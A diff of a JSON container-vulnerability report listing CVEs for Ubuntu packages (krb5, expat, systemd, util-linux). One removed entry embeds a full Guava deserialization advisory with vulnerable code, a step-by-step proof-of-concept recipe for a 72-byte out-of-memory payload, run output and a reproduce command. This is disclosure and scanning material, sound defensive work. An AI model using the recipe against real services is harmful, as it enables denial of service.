-    "description": "# CompactHashMap/CompactHashSet/MapMakerInternalMap native deserialization triggers uncontrolled memory allocation\n\n## Summary\n\n`CompactHashMap`, `CompactHashSet`, and `MapMakerInternalMap` implement `readObject(ObjectInputStream)` by reading an attacker-controlled `elementCount` or `initialCapacity` from the stream. On the very first insertion during or after deserialization (for the `CompactHash*` collections, inside `allocArrays()`) or immediately during deserialization (for `MapMakerInternalMap`), the implementation eagerly allocates arrays sized to that full, unvalidated value (up to `CompactHashing.MAX_SIZE` = 2^30-1, ~1.07 billion, for example) before the rest of the stream's actual content has been consumed. A 72-byte malicious serialized stream containing a single tiny element can force a multi-gigabyte allocation and crash a JVM with `OutOfMemoryError`, dynamically confirmed against the current release.\n\n## Details\n\n`CompactHashMap.readObject()` (`guava/src/com/google/common/collect/CompactHashMap.java`):\n\n```java\nprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {\n  stream.defaultReadObject();\n  int elementCount = stream.readInt();\n  if (elementCount < 0) {\n    throw new InvalidObjectException(\"Invalid size: \" + elementCount);\n  }\n  init(elementCount);\n  for (int i = 0; i < elementCount; i++) {\n    K key = (K) stream.readObject();\n    V value = (V) stream.readObject();\n    put(key, value);\n  }\n}\n```\n\n`elementCount` is only checked for being non-negative; there is no upper bound and no relationship enforced between the declared count and how much data actually follows in the stream. `init(elementCount)` (line 251) just stores the value (clamped to `[1, CompactHashing.MAX_SIZE]`, i.e. up to 2^30-1):\n\n```java\nvoid init(int expectedSize) {\n  Preconditions.checkArgument(expectedSize >= 0, \"Expected size must be >= 0\");\n  this.metadata = Ints.constrainToRange(expectedSize, 1, CompactHashing.MAX_SIZE);\n}\n```\n\nThe real allocation is deferred to `allocArrays()`, which fires lazily on the *first* `put()` call — i.e. after only one key/value pair has actually been read off the wire:\n\n```java\nint allocArrays() {\n  ...\n  int expectedSize = metadata;\n  int buckets = CompactHashing.tableSize(expectedSize);\n  this.table = CompactHashing.createTable(buckets);\n  setHashTableMask(buckets - 1);\n  this.entries = new int[expectedSize];\n  this.keys = new Object[expectedSize];\n  this.values = new Object[expectedSize];\n  return expectedSize;\n}\n```\n\nWith `expectedSize` near `CompactHashing.MAX_SIZE` (2^30-1), this single call allocates a hash `table` plus three `expectedSize`-length arrays — multiple gigabytes — triggered by a stream that has, at that point, only supplied one small real element. `CompactHashSet.readObject()`/`allocArrays()` have the identical shape. `CompactLinkedHashMap`/`CompactLinkedHashSet` extend these classes and inherit the same unguarded path.\n\nThe problem with `MapMakerInternalMap` is similar, with [a size read from the serialized data and stored in a `MapMaker` instance](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2848-L2851) for [later user during deserialization](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2897), when [the `MapMaker` is passed back to `MapMakerInternalMap`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMaker.java#L287) and [segments are allocated](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L173-L200) by [calling `newSegment`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1143), whose implementations ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L443)) create `Segment` instances ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2019)) that [allocate arrays of the requested capacity](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1234) through [the `newTable`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1262) helper.\n\nThis is the same amplification shape as the already-fixed **CVE-2018-10237** (`AtomicDoubleArray`/`CompoundOrdering`: attacker declares a large size, library eagerly allocates before validating against actual stream content). That fix rewrote `AtomicDoubleArray.readObject()` to grow an `ImmutableLongArray.Builder` incrementally per element actually read, rather than pre-allocating from the declared size — Guava's own `HashBiMap.readObject()` documents the same defensive principle explicitly in a comment: `init(16); // resist hostile attempts to allocate gratuitous heap`. `CompactHashMap`/`CompactHashSet` do not follow either of these two patterns already present elsewhere in the same codebase.\n\n**Reachability**: All classes are top-level, `implements ... Serializable`, and require no special classpath setup beyond Guava being present (near-ubiquitous on JVM backends). A native Java deserialization attacker names the class directly in a hand-crafted stream — no particular Guava factory method needs to have been used by the victim application, exactly as with the precedent CVE.\n\n## PoC\n\nFull source and run instructions in the attached `poc-guava-compacthash-dos.zip` (Maven project, `guava:33.7.1-jre` — the current latest release — as the only dependency). The PoC:\n\n1. Uses reflection only to legitimately obtain a `CompactHashSet` instance (it is package-private; a real attacker does not need this step, since they craft the serialized bytes directly rather than calling Guava's own serialization code).\n2. Serializes one set with 1 element and one with 2 elements, diffs the two byte streams to locate the exact offset of the `elementCount` field (byte-precise, not guessed).\n3. Patches that one 4-byte field in the 1-element stream from `1` to `0x3FFFFFFF` (`CompactHashing.MAX_SIZE`), leaving the rest of the 72-byte stream (one real `\"A\"` element) untouched.\n4. Feeds the resulting 72-byte malicious stream into a plain `new ObjectInputStream(...).readObject()` call against the real, unmodified `guava-33.7.1-jre.jar`.\n\nActual run output:\n\n```\n### -Xmx8g (generous heap) ###\nLocated size field at offset 63, value=1 (expected 1)\nMalicious stream size: 72 bytes\nDeclared elementCount: 1073741823 (~1.07 billion)\nReal payload: 1 tiny string element (\"A\")\n=== RESULT ===\nException: java.lang.OutOfMemoryError: Java heap space\nTime to allocate+fail: 4013 ms\nHeap used before: 3 MB\nHeap used after (at failure point): 4103 MB\nJVM max heap (-Xmx): 8192 MB\n\n### -Xmx128m (ordinary service-sized heap) ###\nLocated size field at offset 63, value=1 (expected 1)\nMalicious stream size: 72 bytes\nDeclared elementCount: 1073741823 (~1.07 billion)\nReal payload: 1 tiny string element (\"A\")\n=== RESULT ===\nException: java.lang.OutOfMemoryError: Java heap space\nTime to allocate+fail: 24 ms\nHeap used before: 4 MB\nHeap used after (at failure point): 2 MB\nJVM max heap (-Xmx): 128 MB\n```\n\nA 72-byte input forces ~4.1 GB of real allocation before failing on an 8 GB heap, and crashes a 128 MB heap in 24 ms — over 50,000x amplification between input size and forced allocation.\n\nTo reproduce: `mvn -q compile dependency:build-classpath -Dmdep.outputFile=cp.txt && java -Xmx128m -cp \"target/classes:$(cat cp.txt)\" poc.Poc`\n\n## Impact\n\nUncontrolled resource consumption (CWE-770 / CWE-400) via native Java deserialization: any application that runs `ObjectInputStream.readObject()` on data reachable by an attacker, and has Guava on its classpath (true for a large fraction of the JVM ecosystem), can be crashed with a single ~72-byte payload, regardless of what type the application itself expected to deserialize.\n\n## Severity\n\nCVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` — identical vector to CVE-2018-10237, the precedent this is a sibling of. Recomputed with the full formula: exploitability = 8.22×0.85×0.44×0.85×0.85 = 2.221; ISS = 1-(1×1×0.44) = 0.56; impact = 6.42×0.56 = 3.595; base = roundup(5.816) = **5.9 (Medium)**.\n\n## Affected\n\n`com.google.guava:guava`, all editions (`-jre`/`-android`) — confirmed on the current latest release, 33.7.1-jre. `CompactHashMap`/`CompactHashSet`/`CompactLinkedHashMap`/`CompactLinkedHashSet` have had this same `readObject`/`allocArrays` shape for a long time (probably since they were added in Guava 23.6), and similarly for `MapMakerInternalMap` (which was introduced in Guava 4.0); not tested against older individual releases.\n\n## Suggested fix\n\nApply the same defense already used elsewhere in this codebase: either clamp the initial `init()` capacity to a small constant regardless of the declared `elementCount` (as `HashBiMap.readObject()` already does — `init(16); // resist hostile attempts to allocate gratuitous heap`) and grow incrementally as elements are actually read, or grow the backing arrays incrementally per iteration of the deserialization loop (as the fixed `AtomicDoubleArray.readObject()` does via `ImmutableLongArray.Builder`) instead of eagerly sizing to the full attacker-declared count on first insert."
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-107708",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-107708?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "MIT krb5 through 1.22.2 contains a NULL pointer dereference vulnerability in the KDC's get_pac_princ_with_realm() that returns success while leaving the client principal NULL on malformed names. A malicious or compromised cross-realm trusted KDC can send an S4U2Proxy request with a PAC carrying a malformed client name to crash krb5kdc and deny authentication."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-71200",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-71200?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "[Unknown description]"
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-107364",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-107364?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "[Unknown description]"
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112314",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112314?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "clnttcp_call() in lib/rpc/clnt_tcp.c in MIT Kerberos 5 (aka krb5) does not free the RPC reply verifier between retries, which allows remote attackers to cause a denial of service (memory leak in GSS-RPC client programs) by injecting RPC replies with mismatched XIDs or by triggering authentication retries."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112320",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112320?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "The GSS-RPC transport layer in MIT Kerberos 5 (aka krb5) 1.4 and later does not release the previous authentication context when a client switches from an RPCSEC_GSS or AUTH_GSSAPI flavor to a non-GSS flavor on the same TCP connection. This allows remote attackers to cause a denial of service (memory exhaustion in kadmind) by repeatedly establishing and abandoning GSS authentication contexts."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-71199",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-71199?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "[Check for unkeyed checksums when validating CAMMAC verifiers]"
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112317",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112317?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "krb5_ktkdb_get_entry() in lib/kdb/keytab.c in MIT Kerberos 5 (aka krb5) 1.2.8 and later does not free decrypted key material when a post-decryption check fails, which allows remote attackers to cause a denial of service (memory leak in the KDC or kadmind) via requests that repeatedly trigger key decryption failures."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112318",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112318?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "The policy RPC stubs in kadmin/server/server_stubs.c in MIT Kerberos 5 (aka krb5) 1.5.3 and later do not reject a NULL policy name decoded by xdr_nullstring(), which allows remote authenticated users to cause a denial of service (kadmind crash via NULL pointer dereference) by sending a policy request with an empty policy name that reaches authorization checks or logging code."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-107884",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-107884?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "[Check for the lockdown_keys attribute when processing password change protocol requests in kadmind]"
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112321",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112321?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "The AUTH_GSSAPI handler in lib/rpc/svc_auth_gssapi.c in MIT Kerberos 5 (aka krb5) does not free decoded arguments on certain error paths, which allows remote attackers to cause a denial of service (memory exhaustion in kadmind) via crafted AUTH_GSSAPI_INIT requests that trigger authentication failures."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112322",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112322?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "clean_client() in lib/rpc/svc_auth_gssapi.c in MIT Kerberos 5 (aka krb5) restarts its scan from the head of the client list after each removal, resulting in quadratic CPU cost. Remote attackers can cause a denial of service (CPU consumption in kadmind) by accumulating a large number of AUTH_GSSAPI client entries."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-118380",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-118380?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "[Unknown description]"
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-119079",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-119079?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "decode_sequence_of() in lib/krb5/asn.1/asn1_encode.c in MIT Kerberos 5 (aka krb5) 1.11 and later grows the decoded element array one entry at a time, which allows remote attackers to cause a denial of service (CPU consumption in the KDC) by sending an unauthenticated AS-REQ or TGS-REQ with a large number of elements in a SEQUENCE OF field over TCP."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112319",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112319?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "The GSS-RPC layer in MIT Kerberos 5 (aka krb5) does not enforce size limits on XDR-decoded data, which allows remote authenticated users to cause a denial of service (memory exhaustion or excessive CPU consumption in kadmind) via crafted RPC requests that trigger unbounded memory allocations during XDR decoding."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-107778",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-107778?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "MIT Kerberos 5 (krb5) through 1.22.2 contains a NULL pointer dereference in make_cred_list() in rd_cred.c that allows authenticated Kerberos clients to crash services by sending mismatched KRB-CRED arrays. Attackers can send forwarded credentials with more tickets than ticket_info entries through gss_accept_sec_context() to crash GSS-API acceptor services, causing denial of service."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112316",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112316?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "xdr_krb5_tl_data() in lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) does not free partially decoded data on failure, which allows remote authenticated users to cause a denial of service (memory leak in kadmind) via crafted RPC requests that trigger a decode failure."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112323",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112323?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "The AUTH_GSSAPI handler in lib/rpc/svc_auth_gssapi.c in MIT Kerberos 5 (aka krb5) 1.5.2 and later allows remote attackers to cause a denial of service (memory exhaustion in kadmind) by sending repeated failed AUTH_GSSAPI_INIT requests. Each failed request allocates client state that is only freed after a 15-minute expiration timeout, allowing an attacker to accumulate memory faster than it is reclaimed."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-112315",
+    "vulnerable_range": "<1.20.1-6ubuntu2.12",
+    "fixed_by": "1.20.1-6ubuntu2.12",
+    "url": "https://scout.docker.com/v/CVE-2026-112315?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C1.20.1-6ubuntu2.12",
+    "description": "The RPCSEC_GSS authentication routines in lib/rpc/authgss_prot.c in MIT Kerberos 5 (aka krb5) 1.4 and later do not free partially decoded buffers on failure, which allows remote attackers to cause a denial of service (memory leak in kadmind) via crafted RPCSEC_GSS messages."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-2219",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-2219?s=ubuntu&n=dpkg&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "It was discovered that dpkg-deb (a component of dpkg, the Debian package management system) does not properly validate the end of the data stream when uncompressing a zstd-compressed .deb archive, which may result in denial of service (infinite loop spinning the CPU)."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-121876",
+    "vulnerable_range": ">=0",
+    "fixed_by": null,
+    "url": "https://scout.docker.com/v/CVE-2026-121876?s=ubuntu&n=systemd&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "A flaw was found in the interaction between systemd-gpt-auto-generator and confidential computing guest VM images in OpenShift Sandboxed Containers (confidential peer pods). systemd-gpt-auto-generator automatically discovers and mounts GPT partitions by type GUID at boot with no user confirmation. In the confidential computing threat model, where the host/hypervisor is the adversary, a malicious host can inject partitions into the guest's virtual disk. Most critically, injecting a swap partition causes the guest kernel to page out TEE-encrypted memory to a host-controlled block device, breaking the confidentiality guarantee of the hardware TEE (AMD SEV-SNP, Intel TDX).  The PodVM images use a GPT-partitioned disk with dm-verity on the root partition. However, the roothash= kernel parameter only disables root auto-discovery — non-root partitions (swap, /home, /var, /srv, /var/tmp) are still auto-discovered and mounted. The generator is shipped unmasked in the  RHEL systemd-udev subpackage, and no kernel command line parameter in the measured UKI addon disables it. Additionally, the PodVM measurement script captures PCRs 3, 9, 11, and 12, but not PCR 5 (GPT partition table), so partition table modifications are not detected by remote attestation."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-128241",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-128241?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "The xmlwf tool in libexpat through 2.10.0 contains a symlink following vulnerability because -d output mode opens files with fopen(\"wb\"), which follows symbolic links. Local attackers with write access to the output directory can plant a symlink at the expected output name to truncate or overwrite files writable by the xmlwf user."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-134703",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-134703?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "libexpat through 2.10.0 contains an improper Unicode handling vulnerability in DEFINE_UTF16_TO_UTF16 conversion functions in xmltok.c that can split valid surrogate pairs when output space is limited. In XML_UNICODE builds parsing non-native byte order UTF-16 input, attackers can supply crafted documents that deliver lone high surrogates to character data and default handlers."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-124317",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-124317?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "libexpat through 2.10.0 contains an out-of-bounds read vulnerability in unknown_toUtf8() and unknown_toUtf16() in xmltok.c when handling application-registered unknown encodings. Attackers can supply a document ending in a truncated multibyte sequence so the convert callback reads past the parse buffer, leaking adjacent memory or crashing applications."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-102633",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-102633?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "libexpat versions 2.7.2 through 2.8.5 contain an integer overflow vulnerability in expat_realloc() function on 32-bit platforms when computing allocation sizes. Attackers supplying malicious XML to applications parsing with vulnerable libexpat can cause heap buffer overflow, memory corruption, or denial of service."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-115506",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-115506?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "libexpat through 2.9.0 contains a denial of service vulnerability because billion laughs protection in accountingDiffTolerated() in xmlparse.c detects entity amplification too late. Attackers can supply a moderately sized XML document with a large DTD and nested entity expansions to consume tens of seconds of CPU per parse."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-93990",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-93990?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "Expat before 2.8.5 fails to validate that a high surrogate in UTF-16 input is followed by a low surrogate, allowing malformed UTF-16 sequences to be accepted. Attackers can supply UTF-16 encoded XML containing lone high surrogates that consume the following code unit, causing Expat to pass unpaired surrogates to applications built with XML_UNICODE and to silently replace input characters in other builds."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-77214",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-77214?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "libexpat before commit 13c5f63 contains a heap buffer over-read vulnerability in xmlparse.c. XML_ParseBuffer advances the parse buffer end with parser->m_bufferEnd += len using a caller-supplied length that is not validated against the allocated buffer size, so repeated XML_ParseBuffer calls move m_bufferEnd past the end of the heap allocation and subsequent parsing reads out of bounds. Reaching this path requires a parse buffer to already be present; otherwise XML_ParseBuffer returns XML_ERROR_NO_BUFFER. A buffer is present after a prior call to XML_GetBuffer, either directly (the common case) or indirectly through a prior XML_Parse call that allocates the buffer internally. The over-read discloses adjacent heap memory to the calling application, recovering heap pointers, libc function pointers, and code pointers sufficient to defeat ASLR and build further exploitation primitives."
   },
   {
     "severity": "MEDIUM",
     "source_id": "CVE-2026-117610",
-    "vulnerable_range": ">=0",
-    "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-117610?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-117610?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
     "description": "libexpat through 2.9.0 contains a NULL pointer dereference vulnerability in externalEntityInitProcessor2() in lib/xmlparse.c that mishandles the XML_TOK_NONE token from empty input. Attackers who control stream chunking can force an empty non-final first parse on an external entity subparser, causing a later parse to crash the application."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-118370",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-118370?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "libexpat through 2.9.0 contains a signed integer overflow vulnerability in storeAtts() in lib/xmlparse.c that allows attackers to trigger out-of-bounds writes via oversized attribute counts. Attackers can supply a multi-gigabyte document with a start tag carrying over 2^30 attributes to overflow attIndex and nPrefixes, crashing applications or corrupting heap memory."
+  },
+  {
+    "severity": "MEDIUM",
+    "source_id": "CVE-2026-113351",
+    "vulnerable_range": "<2.6.1-2ubuntu0.7",
+    "fixed_by": "2.6.1-2ubuntu0.7",
+    "url": "https://scout.docker.com/v/CVE-2026-113351?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3C2.6.1-2ubuntu0.7",
+    "description": "libexpat 2.7.2 through 2.9.0 contains a denial of service vulnerability because XML_ParserReset zeroes the direct byte count but never offsets tracked heap allocations. Attackers can submit a large XML document so later documents on the same reset parser fail with XML_ERROR_NO_MEMORY until it is recreated."
   },
   {
     "severity": "MEDIUM",
@@ -73,35 +305,19 @@
   },
   {
     "severity": "MEDIUM",
-    "source_id": "CVE-2026-113351",
+    "source_id": "CVE-2026-76642",
     "vulnerable_range": ">=0",
     "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-113351?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
-    "description": "libexpat 2.7.2 through 2.9.0 contains a denial of service vulnerability because XML_ParserReset zeroes the direct byte count but never offsets tracked heap allocations. Attackers can submit a large XML document so later documents on the same reset parser fail with XML_ERROR_NO_MEMORY until it is recreated."
+    "url": "https://scout.docker.com/v/CVE-2026-76642?s=ubuntu&n=util-linux&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
+    "description": "util-linux versions through 2.41.5 and 2.42.2 fail to check mount helper exit status before running post-mount hooks, allowing unprivileged users to execute privileged operations on pre-existing filesystems. Attackers can exploit X-mount.idmap or X-mount.owner hooks to clone filesystems with inherited suid bits or modify target inode permissions after a helper fails, achieving privilege escalation."
   },
   {
     "severity": "MEDIUM",
-    "source_id": "CVE-2026-77214",
+    "source_id": "CVE-2026-95209",
     "vulnerable_range": ">=0",
     "fixed_by": null,
-    "url": "https://scout.docker.com/v/CVE-2026-77214?s=ubuntu&n=expat&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0",
